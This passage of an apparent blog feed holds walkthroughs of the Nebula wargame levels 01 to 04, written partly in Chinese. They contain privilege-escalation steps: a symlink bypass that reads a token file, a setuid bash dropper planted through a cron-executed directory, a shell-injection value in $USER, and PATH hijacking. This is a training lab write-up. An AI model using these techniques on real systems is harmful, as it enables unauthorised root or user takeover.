+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
+</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="n">rc</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s [file to read]</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+</span><span class='line'>    <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">&quot;token&quot;</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;You may not access &#39;%s&#39;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span><span class='line'>    <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">O_RDONLY</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>    <span class="n">err</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">,</span> <span class="s">&quot;Unable to open %s&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">rc</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">rc</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>    <span class="n">err</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">,</span> <span class="s">&quot;Unable to read fd %d&quot;</span><span class="p">,</span> <span class="n">fd</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">rc</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This one is easy, just creating a soft link in the home directory of user <em>level04</em>, and making it readable for user <em>flag03</em> could bypass the check of the above code, of cause the name of the sofe link could not be <em>token</em> :-P.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>ln -s /home/flag04/token /home/level04/aa
+</span><span class='line'><span class="nv">$ </span>chmod a+rx /home/level04
+</span><span class='line'><span class="nv">$ </span>/home/flag04/flag04 /home/level04/aa
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<!-- 06508b5e-8909-4f38-b630-fdb148a848a2 -->
+
+
+<p>And it works!</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Exploit Exercises - Nebula Level 03]]></title>
+    <link href="http://hanjc.me/blog/2014/01/09/nebula-level03/"/>
+    <updated>2014-01-09T17:03:25+08:00</updated>
+    <id>http://hanjc.me/blog/2014/01/09/nebula-level03</id>
+    <content type="html"><![CDATA[<h3>About</h3>
+
+<p>Check the home directory of flag03 and take note of the files there.</p>
+
+<p>There is a crontab that is called every couple of minutes.</p>
+
+<p>To do this level, log in as the level03 account with the password level03 . Files for this level can be found in /home/flag03.</p>
+
+<!-- more -->
+
+
+<h3>Solution</h3>
+
+<p>No source code is available for this level, but there is a shell script in the home directory of user flag03</p>
+
+<figure class='code'><figcaption><span>writable.sh</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="c">#!/bin/sh</span>
+</span><span class='line'><span class="k">for </span>i in /home/flag03/writable.d/* ; <span class="k">do</span>
+</span><span class='line'>  <span class="o">(</span><span class="nb">ulimit</span> -t 5; bash -x <span class="s2">&quot;$i&quot;</span><span class="o">)</span>
+</span><span class='line'>  rm -f <span class="s2">&quot;$i&quot;</span>
+</span><span class='line'><span class="k">done</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This script would be executed periodly by cron, after I have finished this level, I logged in with the admin account and get the content of the corresponding crontab file</p>
+
+<figure class='code'><figcaption><span>/var/spool/cron/crontabs/flag03</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='sh'><span class='line'>*/3 * * * * /home/flag03/writable.sh
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>For the meaning of this crontab file, please refer to the <a href="https://wiki.archlinux.org/index.php/cron">Cron Wiki</a> of Archlinux.</p>
+
+<p>Back to the script located in <em>/home/flag03</em>, this script does the following things</p>
+
+<ol>
+<li>limits the use cpu time to be 5s</li>
+<li>iterately executes all the executable files in directory <em>/home/flag03/writable.d/</em></li>
+<li>delete these executables after executing</li>
+</ol>
+
+
+<p>This crontab runs in user <em>flag03</em>, we could leverage it to do something interesting, like changing the home directory of user <em>flag03</em> to be public readable and writable, but what we need is beyond this.</p>
+
+<p>It is easy to find a way to get the privilege of user <em>flag03</em> after all we have read in the previous exercises. So I wrote the following code in C</p>
+
+<figure class='code'><figcaption><span>flag03.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span><span class='line'>  <span class="n">setresuid</span><span class="p">(</span><span class="mi">996</span><span class="p">,</span> <span class="mi">996</span><span class="p">,</span> <span class="mi">996</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p></p>
+
+<p>The uid 996 is got by reading <em>/etc/passwd</em></p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="nl">flag03:</span><span class="n">x</span><span class="o">:</span><span class="mi">996</span><span class="o">:</span><span class="mi">996</span><span class="o">::/</span><span class="n">home</span><span class="o">/</span><span class="n">flag03</span><span class="o">:/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>What I need now is to make user <em>flag03</em> compile this C code into an executable that could be run by <em>level04</em> and the set-user-ID bit is set. So I wrote the following script</p>
+
+<figure class='code'><figcaption><span>compile</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='sh'><span class='line'>gcc -o /home/flag03/flag03 /home/level03/flag03.c
+</span><span class='line'>chmod 777 /home/flag03/flag03
+</span><span class='line'>chmod +s /home/flag03/flag03
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>To make the file <em>/home/level03/flag03.c</em> readable by user flag03, I changed the permission of my home directory</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>chmod a+rx /home/level03
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now, place the compile script into <em>/home/flag03/writable.d&#8221;, and wait patiently for the execution of crontab. After this script is called, I got an executable in </em>/home/flag03<em> to help me get the privilege of user </em>flag03* :)</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Exploit Exercises - Nebula Level02]]></title>
+    <link href="http://hanjc.me/blog/2014/01/09/nebula-level02/"/>
+    <updated>2014-01-09T15:13:38+08:00</updated>
+    <id>http://hanjc.me/blog/2014/01/09/nebula-level02</id>
+    <content type="html"><![CDATA[<p>基本过程与level01一样，先看/home/flag02/flag02的源代码：</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">gid_t</span> <span class="n">gid</span><span class="p">;</span>
+</span><span class='line'>  <span class="n">uid_t</span> <span class="n">uid</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
+</span><span class='line'>  <span class="n">uid</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">setresuid</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">buffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">asprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">,</span> <span class="s">&quot;/bin/echo %s is cool&quot;</span><span class="p">,</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&quot;USER&quot;</span><span class="p">));</span>
+</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;about to call system(</span><span class="se">\&quot;</span><span class="s">%s</span><span class="se">\&quot;</span><span class="s">)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">system</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<!-- more -->
+
+
+<p>先通过$USER构建了一个字符串，然后执行该字符串。比如正常情况下</p>
+
+<pre><code>buffer="/bin/echo level02 is cool"
+</code></pre>
+
+<p>在这里echo程序用了绝对路径，不过那个$USER明显是让我们加以利用的……在本例中echo程序是动不了的了，那怎么能执行其他的命令呢？也很简单，Linux本来就可以在一行中执行多条语句，这里选择用“;”来分割。如下修改$USER</p>
+
+<pre><code>USER="haha; /bin/bash"
+</code></pre>
+
+<p>其实这里完全可以使用/bin/getflag的，就直接过掉了，不过每次都这么玩儿没意思，试试开个console吧。修改之后执行：</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>~ <span class="nv">$ </span>/home/flag02/flag02
+</span><span class='line'>about to call system<span class="o">(</span><span class="s2">&quot;/bin/echo haha; /bin/bash is cool&quot;</span><span class="o">)</span>
+</span><span class='line'>haha
+</span><span class='line'>/bin/bash: is: No such file or directory
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>擦，bash执行的时候把后边的is cool当成参数了，这也简单，再次祭出“;”把bash跟他们分开</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">USER</span><span class="o">=</span><span class="s2">&quot;haha; /bin/bash;&quot;</span>
+</span><span class='line'>level02@nebula:~<span class="nv">$ </span>/home/flag02/flag02
+</span><span class='line'>about to call system<span class="o">(</span><span class="s2">&quot;/bin/echo haha; /bin/bash; is cool&quot;</span><span class="o">)</span>
+</span><span class='line'>haha
+</span><span class='line'>flag02@nebula:~<span class="err">$</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>这样就开了个用户为flag02的bash出来。</p>
+
+<h3>补充</h3>
+
+<p>其实Linux中分隔命令不止“;”这一种方法，总结下这些分隔符的不同如下：</p>
+
+<ul>
+<li>“;”：顺序执行所有命令，后一个在前一个之行结束之后才会执行</li>
+<li>“&amp;&amp;”：顺序执行，前一个命令成功执行之后才会执行下一个</li>
+<li>“||”：顺序执行，知道成功执行了一个命令为止（如果第一个成功了，后边的就不会执行）</li>
+</ul>
+
+
+<p>还有种方法也可以起到在一行中分隔多个命令的方法，是使用“&amp;”符号，“&amp;”的本意是在一个新的进程中执行命令，对于分割命令这个目的而言算是一种曲线救国的方法了吧……注意因为“&amp;”本身并不是为分隔命令而用的，所以跟其他的有些许不一样，比如以下两条命令</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>la &amp; ll
+</span><span class='line'><span class="nv">$ </span>la &amp; ll &amp;
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>第一条会在新的进程中执行la，而在本进程中执行ll，第二条则会新起两个进程分别执行la和ll。</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Exploit Exercises - Nebula Level01]]></title>
+    <link href="http://hanjc.me/blog/2014/01/09/nebula-level01/"/>
+    <updated>2014-01-09T14:54:40+08:00</updated>
+    <id>http://hanjc.me/blog/2014/01/09/nebula-level01</id>
+    <content type="html"><![CDATA[<p>有了level00的铺垫，level01就非常简单直接了。感觉上Nebula系列的基本要求是用levelXX用户登录，通过放在/home/flagXX目录下的可执行程序来获得flagXX的用户权限，对于level01而言，可执行程序为/home/flag01/flag01，其源代码在网站上给出了：</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="n">gid_t</span> <span class="n">gid</span><span class="p">;</span>
+</span><span class='line'>  <span class="n">uid_t</span> <span class="n">uid</span><span class="p">;</span>
+</span><span class='line'>  <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
+</span><span class='line'>  <span class="n">uid</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">setresuid</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">system</span><span class="p">(</span><span class="s">&quot;/usr/bin/env echo and now what?&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<!-- more -->
+
+
+<p></p>
+
+<p>前边代码的作用在上一篇博客中提到了，为了使当前的effective uid为flag01，所以system这一句是以flag01这个user的权限执行的。通过/usr/bin/env程序执行了echo程序，在屏幕上打印“and now what？”，不过在执行echo这个命令的时候没有使用绝对路径，使得通过修改$PATH来执行任意程序成为了可能。在本例中，通过修改$PATH和重定向来直接以flag01用户执行/bin/getflag程序：</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>~ <span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/home/level01:<span class="nv">$PATH</span>
+</span><span class='line'>~ <span class="nv">$ </span>ln -s /bin/getflag /home/level01/echo
+</span><span class='line'>~ <span class="nv">$ </span>/home/flag01/flag01
+</span><span class='line'>You have successfully executed getflag on a target account
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>这样就可以了。通过重定向其他程序为/home/level01/echo，可以用flag01用户执行任意程序。</p>
+]]></content>
+  </entry>
+  
+</feed>
